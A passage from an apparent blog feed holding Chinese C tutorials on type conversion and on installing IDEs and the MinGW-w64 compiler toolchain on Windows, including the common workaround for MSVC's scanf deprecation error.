+ b) * c); <span class="comment">// 输出结果为25</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里涉及到<code>运算符的优先级</code>,同样,现在进行详细讲解还为时过早.</p><h2 id="两种类型转换">两种类型转换</h2><p>前面我们分别举了整型计算和浮点型计算的例子,那么问题来了,这个程序输出的是什么:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>, b = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a / b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你觉得输出的是<code>1.5</code>,那么很遗憾,你完全忽略了上面讲的数据类型的知识!</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923155340995.png" alt="image-20230923155340995" style="zoom:33%;" /><p>运行结果可能出乎你的预料,是<code>1</code>!原因很简单,a和b都是int类型,那么很自然的,C语言没有理由自动的为你将a/b作为一个double类型的值,而是只会是一个int,那么实际上1.5的0.5被忽略了,而且是直接舍弃,没有四舍五入.</p><p>换句话说, <code>/运算符</code>对于int变量,执行的叫做<code>整除</code>,这里的<code>a/b相当于[a/b],这里的[]代表向下取整</code>.</p><p>那么解决的办法也很简单,使用类型转换.</p><h3 id="隐式类型转换">隐式类型转换</h3><p>将a或b中的其中任何一个声明为double即可(或者两个都是double),此时,C语言会有一个<code>类型提升</code>,也就是说,其中那个精度较低的变量(int类型的那一个)会被提升为和另一个变量相同的精度更高的类型(double),此时,double类型的值就可以保留浮点:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> a = <span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">2</span>; <span class="comment">// 这里将a声明为double</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lf&quot;</span>, a / b); <span class="comment">// 注意此时需要用%lf来输出浮点数!!!</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923160409779.png" alt="image-20230923160409779" style="zoom:33%;" /><p>这里的&quot;类型提升&quot;实际上是一个<code>隐式类型转换</code>,顾名思义,C程序默默地将b提升为double.</p><p>转换对应的两种类型必须能够互相转换,否则会报错,例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>, *p = &amp;a;</span><br><span class="line"><span class="type">double</span> b = <span class="number">3</span>;</span><br><span class="line">b = p; <span class="comment">// 错误,int*类型的指针值不能转换为double类型</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lf&quot;</span>, a); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过,如果一种类型的值赋值给另一种类型的变量,如果可以转换过去的话,那么将不会报错,而是可能产生一个警告,但可以通过编译.</p><p>另外,必须注意的是,从高精度值向低精度值转换会损失信息:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> pi = <span class="number">3.14</span>; <span class="comment">// 这里a声明为double</span></span><br><span class="line"><span class="type">int</span> b = pi*<span class="number">2</span>; <span class="comment">// 本意是让b存储2倍的pi</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, b); <span class="comment">// 注意此时需要用%d来输出b!</span></span><br><span class="line"><span class="comment">// 但是输出结果为6,小数部分丢失!</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="显式-强制-类型转换">显式(强制)类型转换</h3><p>与之对应的,我们可以进行<code>显式类型转换(或者说强制类型转换)</code>,使用方式是在要提升的值前加一对小括号,括号内写要转换为的类型:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>,b = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lf&quot;</span>, (<span class="type">double</span>)a / b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此程序同样输出<code>1.500000</code></p><p>需要注意的是,由于<code>强制类型转换</code>的<code>优先级</code>大于<code>/</code>运算符,因此实际上被强制类型转换的是<code>a</code>,然后<code>b</code>被隐式转换为double类型,和提升后的<code>a</code>进行运算,最终的结果是double类型.</p><h3 id="类型转换与运算符">类型转换与运算符</h3><p>实际上,如果某个运算符的两个操作数类型不同,那么该运算符会先将精度更低的操作数隐式类型转换(也就是所谓的类型提升)为精度更高的操作数的类型,然后再以该类型进行运算,以保证类型匹配,同时避免精度损失.</p><p>当然,这种转换是有限度的,如果两种类型完全无法兼容,那么会报错.</p><h1 id="附注">附注</h1><h2 id="标准中对算数类型的定义">标准中对算数类型的定义</h2><p>可以参阅</p><p><a href="https://zh.cppreference.com/w/c/language/arithmetic_types">https://zh.cppreference.com/w/c/language/arithmetic_types</a></p><p>中的内容,对各种类型都有明确清晰的描述.</p><p>里面不仅有类型的用途,大小,并且还有它们取值范围的参考.</p><p align=right>---WAHAHA</p><br><br><p>上一篇:<a href="../2023bb3b8099b657/">c语言教程-2-环境搭建</a></p><p>下一篇:<a href="../2023427f4611cc41/">C语言教程-3_2-基本输入输出</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-2-环境搭建</title>
      <link href="/2023bb3b8099b657/"/>
      <url>/2023bb3b8099b657/</url>
      
        <content type="html"><![CDATA[<p>无论什么语言的学习,都需要搭建学习环境,事实上,对于编程而言,我们搭建的学习环境,其实基本就是真正的开发环境.</p><p>本章系统讲解几种常见软件(工具)的安装.此外,也会花费一些功夫聊聊软件的选择.</p><h1 id="c语言编译环境需要什么">C语言编译环境需要什么</h1><p>前面提到,C语言是编译型语言,所以需要<code>编译器</code>来进行特定环境下的编译,如果你的C代码写的有较高的兼容性,亦或跨平台性强,那么无论是在什么架构/操作系统下进行编译都能得到良好稳定的结果.</p><p>无论是在Linux,Windows,macos或者是大多数人接触不到的UNIX,都有各自的编译器可供使用.从理论上,我们仅仅需要一个文本编辑器(例如Windows自带的记事本),并安装一个编译器即可开始编写C代码.</p><h2 id="一个文本编辑器">一个文本编辑器?</h2><p>但是,写代码并不是写普通的文章,一段C语言的源代码虽然是纯文本,但是它有着特定的格式,记事本的效果完全是普通的txt,<code>看起来非常简陋</code>,并且仅仅只能编辑代码,不能够执行,所以我们需要使用专用的代码编辑器(往往有插件等来提供运行支持)来进行编写.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929144305925.png" alt="image-20230929144305925" style="zoom: 40%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929144604887.png" alt="image-20230929144604887" style="zoom:33%;" /><p>上面的两张图分别是普通的<code>记事本</code>和专业的<code>Sublime Text4</code>代码编辑器对同一段代码的显示效果,差别一眼可见!</p><h2 id="一个编译器">一个编译器?</h2><p>另一方面,我们其实很少直接使用单独的编译器进行编译,因为我们更希望将整个开发过程集成于一个大型的软件,更加方便,安装IDE(集成开发环境)就是我们实际上最常用的方式.当然,你也可以找一个你喜欢的文本编辑器去编写代码,然后在控制台中输入命令进行手动编译生成可执行文件.</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929145507164.png" alt="image-20230929145507164"><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929145055586.png" alt="image-20230929145055586" style="zoom:45%;" /></p><h2 id="我们要使用什么">我们要使用什么?</h2><p>作为初学者,各位一开始编写的都是简单的代码,但是就算是简单的代码,仅仅为了一个测试就要切换好几个软件未免也太费劲了,所以,我们仍然建议使用一款集成的软件,尽可能的在一个软件完成所有的工作.</p><p>所以我接下来讲解的基本都是IDE的安装,那么至于编译器工具链的安装会在其中穿插讲解.</p><h1 id="windows平台">Windows平台</h1><p>学习编程最常用的平台还是Windows,并且现在基本都是64位的系统,所以并不存在32位的限制.</p><p>Windows平台有许多软件可供使用,例如Visual Studio(vS),Visual C++(VC++),DEV-C++,CLion,VSCode等等都可以选择,我个人从一个初学者的角度出发,推荐使用VS,CLion,或者小熊猫C++这3款.</p><p>大多数课程老师/视频都会推荐你去安装<code>Visual C++ 2010</code>,<code>Visual C++6.0</code>,但是他们或多或少有些老了,当然对于初学者朋友们足够了,但是现在(2023年)了,我们还是希望各位能够跟进更新,使用较为新的软件.特别是<code>Visual C++6.0</code>未免太过老旧(我当初好几年前自学的时候用的这玩意,2023年了,也该换了吧…)</p><h2 id="我建议使用什么软件">我建议使用什么软件</h2><ol><li>较新的软件中,非常出名的是<code>Visual Studio 2022</code>,不过本人这里是相对<code>不建议的</code>.它并不是一个C专门的IDE,实际上他对于C语言的支持远远没有其他软件好,如果你也觉得VS2022未免太过麻烦,可以直接换软件,我们以学习技术为主,不要把时间浪费在折腾软件上.</li></ol><p><s>但是VS的调试功能是真的nb.</s></p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929151338821.png" alt="image-20230929151338821" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929151417364.png" alt="image-20230929151417364" style="zoom: 25%;" /><ol start="2"><li>然后还有一个出名的,新手常常误以为和<code>VS</code>是一个系列的软件的,叫做<code>VSCode</code>,简称<code>VSC</code>(蓝色的那个),它和VS(紫色的那个,例如VS2022)系列完全没有任何关系.<code>VSC</code>是开源软件,它依赖各式各样的插件,所以非常考验用户的配置能力,相对对新手极其不友好!所以我不建议使用,特别是对于零基础的朋友.当然,<code>VSC</code>配置好了还是很强大的,毕竟它精简干练.</li></ol><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929151509660.png" alt="image-20230929151509660" style="zoom:25%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929151641824.png" alt="image-20230929151641824" style="zoom:25%;" /><ol start="3"><li>接下来,我个人建议(强推)的是<code>CLion</code>,这是一个收费软件,并且它基于java开发,所以响应速度上可能稍慢.</li></ol><p>但是,各位想必都是学生,我们可以通过Jetbrain公司(CLion的开发公司)的学生认证来免费使用其专业版!认证非常简单,具体后面再说.</p><p>另外,2023年了,各位大学生的电脑应该都不会差,毕竟大家更多考虑的是能不能流畅玩游戏—中端游戏都能玩了,CLion还带不起来?那不是开玩笑么.并且,各位一般编写代码的速度比它响应你的速度要慢多了…所以,不要去关心那些没有任何必要的细节,CLion是专业的C/C++的IDE,对于C/C++的支持性极高!如果你在其他软件上跑不了代码,可能是软件的问题,但是如果是CLion上,那么大概率是你的使用/代码问题(手动滑稽).</p><p>最香的是!好看!主题高度可定制化!下图就是我自己配置的一套配色(Monokai)!</p><p>总之,CLion这个收费软件还是非常好的,毕竟花钱玩意,学生认证他不香吗…doge</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929151909255.png" alt="image-20230929151909255" style="zoom:25%;" /><ol start="4"><li>虽然但是,CLion对于一些朋友可能确实不能接受,也没关系,我们可以使用一个精简的开发环境—小熊猫C++,他是基于DevC++进一步开发而来,目前已支持gcc12编译器,而且,修复了许多DevC++这款软件中的许多问题.</li></ol><p>如果各位之前使用DevC++,并且恰巧受够了Dev的一些奇葩问题,不妨来试试小熊猫C++.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929152018631.png" alt="image-20230929152018631" style="zoom:25%;" /><h2 id="vs2022的安装">VS2022的安装</h2><p>VS2022是微软的一款IDE,他可以进行包括但不限于C,C++,Python等等的各种语言的开发,号称宇宙第一IDE(功能极其强大),我作为一名使用C的学生,最让我觉得舒服的地方就是他的调试功能,VS的调试功能可以说是非常强大,这一点上CLion就显得比较弱势.但是,<s>VS有点丑</s>.而且文件太多,新手很容易被搞得晕头转向的,默认情况你只能在一个项目包含一个程序,而不能在一个项目里编写多个程序,这也是许多新手常常遇到的问题.</p><p>VS默认使用微软自家的编译器msvc进行编译构建,另外也可以切换成clang(LLVM)编译器.</p><p>但是实际上VS不是针对C开发的…对C的支持相当于附带…毕竟C++基本兼容C.</p><p>而且,初学者200%会遇到scanf和scanf_s这两个东西的问题…</p><h3 id="安装步骤">安装步骤:</h3><p>1.下载安装包</p><p>下载community版本!下载community版本!下载community版本!重要的事情说三遍,VS社区版不收费!!!</p><p>请认准官网,不要下载到盗版的什么安装助手.<a href="https://visualstudio.microsoft.com/zh-hans/vs/">https://visualstudio.microsoft.com/zh-hans/vs/</a></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919185951583.png" alt="image-20230919185951583"></p><p>2.下载后直接运行,等待初始化完成后进行选择,由于我已经安装过所以显示的是修改,实际要点安装community版</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919190144768.png" alt="image-20230919190144768"></p><p>3.点击安装后只在工作负荷中选择&quot;使用C++的桌面开发&quot;,其他的什么都不用管!</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919190249856.png" alt="image-20230919190249856" style="zoom:50%;" /><p>4.然后如果你有D盘,并且空间足够的话,最好点击安装位置,将所有你能看到的路径全部由C:\改成D:,因为VS比较庞大,放C盘容易炸.</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919190426282.png" alt="image-20230919190426282"></p><p>5.然后右下角点击安装即可.</p><p>安装完成后关闭安装工具,就可以直接开始使用了,VS默认使用MSVC编译器,所以你无需再另外安装编译器.</p><h3 id="测试是否安装成功">测试是否安装成功</h3><p>打开VS2022软件,我们就可以创建第一个项目,来编写一个hello world程序,这时你最好要提前想好你的代码都要存到哪里,方便找到,或者你实在不会就选默认也行.</p><p>点击创建新项目:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919190741202.png" alt="image-20230919190741202" style="zoom:50%;" /><p>选择&quot;控制台应用&quot;或者&quot;空项目&quot;,注意一定要确保标签写着C++而不是其他语言.</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919190855983.png" alt="image-20230919190855983"></p><p>接着项目名和解决方案名随便你起,例如test1就可以:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919191040111.png" alt="image-20230919191040111" style="zoom:50%;" /><p>如果你选择的是控制台应用,那么VS会默认给你创建一个main.cpp,无需你进行创建,如果你选择的是空项目,那么还需要手动添加一个源文件—在左侧的解决方案资源管理器中右键&quot;源文件&quot;文件夹,点击添加-&gt;新建项,然后可以创建一个main.cpp:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919191305052.png" alt="image-20230919191305052" style="zoom:50%;" /><p>这时候一个项目就完全创建好了,你可以在main.cpp中进行编写代码,例如:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919191416465.png" alt="image-20230919191416465"></p><p>此外,我的VS因为之前设置过主题和配色,比默认的好看多了,你如果想美化请自行百度/必应/谷歌.</p><p>运行代码,点击上方的绿色的&quot;播放&quot;按钮即可:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919191534004.png" alt="image-20230919191534004"></p><p>如果程序正常运行,那么恭喜你,你的VS2022已经成功安装.</p><h3 id="注意事项-必须看">注意事项(必须看)</h3><h4 id="安全检查的问题">安全检查的问题</h4><p>另外,要注意的一点就是,VS默认是进行C++的开发,所以你会发现后缀都是.cpp,你改成.c也可以.还有很重要的一点就是,msvc(或者说VS这个IDE)默认是不允许使用scanf等函数的,因为他认为这些函数并不安全(具体原因以后解释,涉及到越界/栈溢出的问题),所以转而要求你使用scanf_s等函数来代替,报错如图:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919192737049.png" alt="image-20230919192737049"></p><p>报错是英文的:<code>'scanf': This function or variable may be unsafe.</code>,所以英语也要多少会一点,不至于连报错提示都看不懂.</p><p>但是,我想说一句话:</p><p><code>学习过程中你可以犯错,让编译器去迁就你,但是如果你要去因为一个编译器的特殊性,你要去迁就编译器,那你这学的就一塌糊涂</code></p><p>我们学C,首先要学的就是标准C,至少也得是ANSI C,不过2023年了,我们至少要学习C99的标准.</p><p>scanf_s等函数是在C11才出现的,目前各大编译器的支持度不高,而且scanf_s和scanf的使用方法也并不相同,所以,一句话,不要使用scanf_s.</p><p>注:解决的是<code>错误</code>,即使用scanf编译会报错,而警告<code>scanf的返回值被忽略</code>不仅仅是VS会警告,其他软件也会警告,这是一个良好的警告,但我们无需关心—scanf的返回值确实有用,但是简单的程序用不到.</p><p>那么为了在VS中正常使用scanf等函数,我们有三种解决办法:</p><h5 id="方法1">方法1:</h5><p>关闭SDL检查</p><p>SDL(Security Development Lifecycle)，安全开发生命周期检查，微软在VS2012新推出的东西，为了能更好的监管开发者的代码安全，如果勾选了这一项则将严格按照SDL的规则编译代码，会有一些以前常用的函数无法通过编译。</p><p>我们只需要把项目的SDL检查关闭即可,<code>注意:每次新建项目都需要进行处理,包括下面的其他方法!</code></p><p>在菜单栏依次点击 项目-&gt;[你的项目名]属性,打开属性窗口,再次点击 配置属性-&gt;C/C+±&gt;常规-&gt;SDL检查:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928163054328.png" alt="image-20230928163054328" style="zoom:33%;" /><p>将SDL检查从<code>是</code>修改为<code>否</code>即可.</p><h5 id="方法2">方法2:</h5><p>为项目添加<code>_CRT_SECURE_NO_DEPRECATE</code>预处理器定义</p><p>在菜单栏依次点击 项目-&gt;[你的项目名]属性,打开属性窗口,再次点击 配置属性-&gt;C/C+±&gt;预处理器-&gt;预处理器定义:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919192447314.png" alt="image-20230919192447314" style="zoom: 33%;" /><p>在结尾先添加一个<code>;</code> ,然后输入<code>_CRT_SECURE_NO_DEPRECATE</code>这一段,点击保存,这时,回到你的包含scanf的程序,再次运行,即可正常:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919193040954.png" alt="image-20230919193040954" style="zoom: 33%;" /><h5 id="方法3">方法3:</h5><p>在每个源文件开头添加一行代码:<code>#define _CRT_SECURE_NO_WARNINGS 1</code>即可:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919193744735.png" alt="image-20230919193744735" style="zoom:33%;" /><p>到此为止,VS2022的基本安装结束,以后遇到任何问题,请不要吝惜你的浏览器,先去网上找解决方案,一搜一大把.</p><h4 id="程序无法写入的问题">程序无法写入的问题</h4><p>有时候会发生编译时无法对程序写入的错误，这是因为上次调试的进程未正确关闭，程序句柄仍在占用，导致拒绝写入目标程序：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240926120138.png" alt="image.png|725"></p><p>解决办法是在任务管理器中杀死对应程序。<br>例如上图中的程序名为 <code>Project1.exe</code> ，按下 <code>ctrl+shift+esc</code> 打开任务管理器，搜索 <code>Project1</code> 然后将对应进程结束即可：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240926120412.png" alt="image.png|600"></p><h2 id="clion的安装">CLion的安装</h2><p>有句玩笑话:“VS对C语言的支持是充话费送的”,确实VS其实是用于编写C++的,但是因为C++和C的关系,也是支持C的,不过可能支持的不是那么好…</p><p>而Clion就是Jetbrain家专门为C/C++设计的IDE,可以说目前常用的IDE中对C语言支持度最高的就是CLion了,但是他的弱点就是启动速度可能比VS还慢…貌似是java写的软件…而且启动后比VS还要占内存空间…</p><p>但是…现在的笔记本电脑卷的一批,随便五六千的电脑都能带起一些3a大作游戏,那么带这些IDE那不是轻轻松松?所以别管那么多,用就完事了,如果你觉得VS实在不好用,或者嫌VS丑,欢迎试试CLion,我个人还装了一个彩色括号的插件,而且配色主题都是自己定制的,随心所欲:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919202458092.png" alt="image-20230919202458092"></p><p>不过,Clion有个问题就是…<code>他收费</code>…但是…初学者大多都是学生吧…Jetbrain是有针对大学生的学生认证的,可以直接免费使用,具体认证方式请自行百度,非常容易.当然,还有一种方式那就是pojie…</p><p>总之,这里仅介绍CLion的安装</p><h3 id="安装步骤">安装步骤:</h3><ol><li>找到官网下载professional版本即可,嫌麻烦就一路默认正常安装即可,不过一般建议将安装路径改到其他盘,不然占用C盘空间不是很好.</li></ol><p>遇到注册码先点击试用,然后去进行学生认证.</p><ol start="2"><li>安装编译器</li></ol><p>首先你可以自行安装MinGW-w64工具链(也就是之前说的独立的编译器,里面包含了gcc等所有工具),安装方法见后面.</p><p>或者可以从CLion中下载:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919195419921.png" alt="image-20230919195419921" style="zoom: 50%;" /><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919195801517.png" alt="image-20230919195801517"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919200413303.png" alt="image-20230919200413303"></p><p>工具集的选择就找到你的MinGW的安装路径即可,只要路径无误,下面的构建工具,C/C+编译器,调试器都会自动识别检测.</p><p>总之你要先安装并配置好MinGW这个工具链才行,很简单的.</p><p>自己配置和从Clion下载是一样的.</p><p>安装好后你就已经完成了,和VS不同,CLion默认使用CMake来管理项目,而且支持一个项目中单个文件的编译执行:</p><h3 id="单文件的编译运行">单文件的编译运行</h3><p>点击main函数头左侧的绿色按钮,点击运行便可直接运行单个文件:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919200730155.png" alt="image-20230919200730155"></p><p>运行结果如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919200839316.png" alt="image-20230919200839316" style="zoom:33%;" /><p>测试成功.</p><p>到此为止,CLion的安装结束,具体使用可以去了解CMake的使用,基本的语法非常简单,可以自行百度.</p><h2 id="devc-小熊猫c-的安装">devC++/小熊猫C++的安装</h2><h3 id="devc-的安装">Devc++的安装</h3><p>下载地址: <a href="https://sourceforge.net/projects/orwelldevcpp/">https://sourceforge.net/projects/orwelldevcpp/</a></p><p>非常简单,一路默认即可,上面的链接中的版本自带工具链(TDM-GCC 4.9.2 32/64bit).</p><p>不过该IDE已经停止更新,个人不是太建议.</p><h3 id="小熊猫c-的安装">小熊猫C++的安装</h3><p>官网: <a href="https://royqh.net/redpandacpp/">https://royqh.net/redpandacpp/</a></p><p>小熊猫C++就是修改后的DEVC++,比devc++好用的多,而且支持最新的gcc12:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919201029204.png" alt="image-20230919201029204"></p><p>安装非常简单,百度找到官网下载<code>自带编译器</code>的版本进行安装即可.</p><p>注:如果你会自行配置编译器(MinGW工具链),也可以下载不带编译器的版本.</p><h2 id="mingw-w64工具链的安装-编译器安装">MinGW-w64工具链的安装(编译器安装)</h2><p>可能很多朋友需要自行安装编译器(例如安装CLion),这里讲解如何安装.</p><p>gcc编译器实际上是linux平台的软件,MinGW就是将gcc移植到Windows的项目.</p><p>MinGW有好多版本,我们无需关心…只需要选择我们需要的就好.</p><h3 id="项目网址">项目网址:</h3><p><a href="https://github.com/niXman/mingw-builds-binaries/releases">https://github.com/niXman/mingw-builds-binaries/releases</a></p><p>这里有这个项目的各个版本,托管在github上,各位可能需要富强</p><h3 id="选择版本">选择版本:</h3><p>我们选择最近的版本即可,目前是13.1.0版本,我们可以发现好几个文件,我们选择这个:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929152703373.png" alt="image-20230929152703373" style="zoom:33%;" /><p>下载的是一个7z压缩包,我们将其解压,解压出来的目录里面就已经可以使用了,无需安装!</p><p>点开里面有一个mingw64文件夹,再进入后有一个bin文件夹,我们使用的gcc编译器就在这个目录里面:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929152902834.png" alt="image-20230929152902834" style="zoom:33%;" /><h3 id="配置环境变量">配置环境变量:</h3><p>但是因为这相当于一个软件集,我们需要把他放在一个妥善的位置,例如D:\devtools\mingw64中</p><p>我们将其放在一个妥善的目录(<code>千万不要放在包含中文的路径下</code>!,例如D:\C语言软件\mingw64就不可以!),然后需要将刚刚说的bin目录加入系统环境变量,以方便终端能找到gcc编译器.</p><p>这里假定我们把mingw64放到了<code>D:\devtools\mingw64</code>中(外面那个超长的文件夹也可以保留,无所谓),那么我们按Win键,直接搜索<code>环境变量</code>,打开找到的<code>编辑系统环境变量</code>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929153352568.png" alt="image-20230929153352568" style="zoom:33%;" /><p>如果你的电脑不是win11,而是win7等版本,可以上网百度如何修改系统环境变量,方法大同小异.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929153707199.png" alt="image-20230929153707199" style="zoom:33%;" /><p>依次点击<code>高级-&gt;环境变量-&gt;系统变量</code>,然后在下面找到<code>Path</code>这个变量,双击打开,然后把这个目录添加到新的一行:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929153943782.png" alt="image-20230929153943782" style="zoom:33%;" /><p>如果你的目录跟我的不一样,请自行修改成你自己的目录!</p><p>随后,一路点击保存,直到所有的窗口关闭.这时候,不出意外的话我们已经装好了!</p><h3 id="测试是否安装成功">测试是否安装成功:</h3><p>我们按<code>Win+r</code>快捷键,打开<code>运行</code>窗口,输入<code>cmd</code>然后按回车,打开终端:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929154210110.png" alt="image-20230929154210110" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929154221912.png" alt="image-20230929154221912" style="zoom:33%;" /><p>在终端输入命令:<code>gcc --version</code>测试gcc是否正常安装:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929154304259.png" alt="image-20230929154304259" style="zoom:33%;" /><p>如果出现类似的信息,则说明成功安装,否则,如果报错<code>gcc不是内部或外部命令，也不是可运行的程序或批处理文件</code>,说明安装出错,需要重新检查各个步骤!</p><h2 id="vscode的安装和配置">VSCode的安装和配置</h2><p>VSCode的配置<s>比较</s>非常麻烦,因为它本身是一个文本编辑器,但是基于其强大的可扩展性,我们可以安装各种插件来将其&quot;打造&quot;成一款优秀高效的&quot;IDE&quot;.</p><h3 id="下载和安装">下载和安装</h3><p>下载地址很好找: <a href="https://code.visualstudio.com/">VSCode官网</a></p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240323202035026.png" alt="image-20240323202035026" style="zoom:50%;" /><p>正常安装即可,同样,最好不要安装到C盘,不过VSCode比较轻量,影响不大.</p><p>至于其他的<code>附加任务</code>等,根据自己需要选择即可,例如可以勾选<code>创建桌面快捷方式</code>.</p><h3 id="基本界面">基本界面</h3><p>侧边栏(左侧)的这几个功能是默认有的,其他的需要安装扩展进行扩充.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240323202700999.png" alt="image-20240323202700999" style="zoom:50%;" /><h3 